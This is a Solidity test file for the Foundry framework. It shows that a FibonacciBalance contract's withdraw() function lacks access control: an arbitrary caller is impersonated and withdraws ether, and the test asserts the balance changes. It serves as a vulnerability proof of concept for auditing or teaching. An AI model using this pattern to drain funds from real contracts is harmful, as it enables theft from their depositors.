
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {FibonacciBalance, FibonacciLib} from "../src/FibonacciBalance.sol";

contract TestAccessControlFibonacciBalance is Test {
    FibonacciBalance public _contractUnderTest;
    FibonacciLib public _fibonacciLib;

    function setUp() public {
        // Deploy the FibonacciLib first
        _fibonacciLib = new FibonacciLib();
        
        // Fund this contract to deploy FibonacciBalance with ether
        vm.deal(address(this), 100 ether);
        
        // Deploy FibonacciBalance with initial funds
        _contractUnderTest = new FibonacciBalance{value: 100 ether}(address(_fibonacciLib));
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // The FibonacciBalance contract has NO access control on withdraw()
        // There is no owner, admin, or any privileged role to exclude
        // This is the vulnerability - anyone can call withdraw()

        // --- 2. State Configuration ---
        
        // The contract already has funds from setUp()
        // No additional state configuration needed
        
        // Record the initial state
        uint256 initialContractBalance = address(_contractUnderTest).balance;
        uint256 initialCallerBalance = caller.balance;
        uint256 initialWithdrawalCounter = _contractUnderTest.withdrawalCounter();

        // --- 3. Execution & Assertion ---
        
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Call the unprotected withdraw function
        // This should succeed for ANY caller, demonstrating the vulnerability
        _contractUnderTest.withdraw();

        // Assert that the withdrawal actually happened
        // The withdrawal counter should have incremented
        assertEq(_contractUnderTest.withdrawalCounter(), initialWithdrawalCounter + 1, "Withdrawal counter should increment");
        
        // The caller should have received funds (fibonacci(1) = start + 1 = 3 + 1 = 4 ether for first withdrawal)
        // For withdrawalCounter = 1, fibonacci(1) = start + 1 = 4
        uint256 expectedWithdrawal = 4 ether; // fibonacci(1) with start=3 is 4
        assertEq(caller.balance, initialCallerBalance + expectedWithdrawal, "Caller should receive fibonacci amount");
        
        // Contract balance should have decreased
        assertEq(address(_contractUnderTest).balance, initialContractBalance - expectedWithdrawal, "Contract balance should decrease");
    }
}
